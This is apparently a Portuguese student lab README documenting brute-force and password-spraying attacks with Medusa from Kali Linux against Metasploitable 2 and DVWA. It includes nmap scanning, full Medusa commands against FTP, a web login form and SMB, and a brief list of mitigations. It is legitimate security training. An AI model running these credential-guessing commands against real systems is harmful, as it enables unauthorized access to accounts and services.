# 🚀 Projeto: Ataques de Força Bruta com Medusa em Ambiente Controlado

## 📌 Descrição Geral

Este projeto tem como objetivo demonstrar, de forma prática e documentada, a utilização do **Kali Linux**, da ferramenta **Medusa**, e de ambientes vulneráveis como **Metasploitable 2** e **DVWA**, para simular ataques de força bruta e compreender técnicas de prevenção.

Você encontrará aqui a estrutura completa do projeto, incluindo ambiente, comandos utilizados, testes e recomendações.

---

## 🛠️ 1. Configuração do Ambiente

### **1.1 Máquinas Virtuais Utilizadas**

* **Kali Linux WSL** 
* **Metasploitable 2** (Alvo)
* **DVWA**

### **1.2 Configuração de Rede**

* **VirtualBox**
* Adaptador em modo **Host-Only** e Bridge na Metasploitable2

### **1.3 Teste de Conectividade**

```bash
ping 192.168.0.137 --> Metasploitable
```

---

## 🔎 2. Varredura Inicial com Nmap

Antes de realizar os ataques simulados, é fundamental identificar portas abertas e serviços ativos.

```bash
nmap -sV -sC 192.168.0.137
```

Registrar portas e serviços encontrados, como:

* FTP (21)
* SSH (22)
* Telnet (23)
* SMB (139/445)
* HTTP (80)

---

## 🔐 3. Ataques de Força Bruta com Medusa

A seguir estão os comandos.

---

## ⚙️ 3.1 Ataque de Força Bruta no FTP

### **Comando utilizado:**

```bash
medusa -h 192.168.0.137 -u /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -P /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt -M ftp
```

### **Validação:**

Após encontrar a senha, conectar via FTP:

```bash
ftp 192.168.0.137
```

---

## 🌐 3.2 Ataque no Formulário Web (DVWA)

### **Configuração:**

* Acessar DVWA
* Ajustar security level para **Low**
* Identificar parâmetros do formulário de login

### **Exemplo de comando Medusa para HTTP Form:**

```bash
medusa -h 192.168.0.138 -u /usr/share/seclists/Usernames/top-usernames-shortlist.txt  -P /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt -M http -m FORM:login.php:username=^USER^&password=^PASS^
```

### **Validação:**

Acessar DVWA com as credenciais encontradas.

---

## 🖥️ 3.3 Password Spraying em SMB

### **Enumeração de usuários:**

```bash
enum4linux 192.168.0.138
```

### **Ataque Medusa para SMB:**

```bash
medusa -h 192.168.0.138 -u /usr/share/seclists/Usernames/top-usernames-shortlist.txt  -P /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt -M smbnt
```

### **Teste de acesso:**

```bash
smbclient -L //192.168.0.138 -U admin
```

---

## 📁 4. Wordlists Utilizadas

* `10-million-password-list-top-1000.txt`
* `top-usernames-shortlist.txt`
* `xato-net-10-million-usernames.txt`

## 🛡️ 5. Medidas de Mitigação

Inclua explicações como:

* Configurar políticas de senha fortes
* Limitar tentativas de login
* Implementar MFA
* Desabilitar serviços desnecessários
* Monitoramento de logs
* Uso de firewall e IDS

---

## 📚 6. Recursos Utilizados

* Kali Linux – Documentação Oficial
* Medusa – Manual
* Nmap – Guia Completo
* DVWA – Repositório Oficial
* Materiais da DIO


---

## 📎 8. Autor

Guilherme Vasconcelos.

---


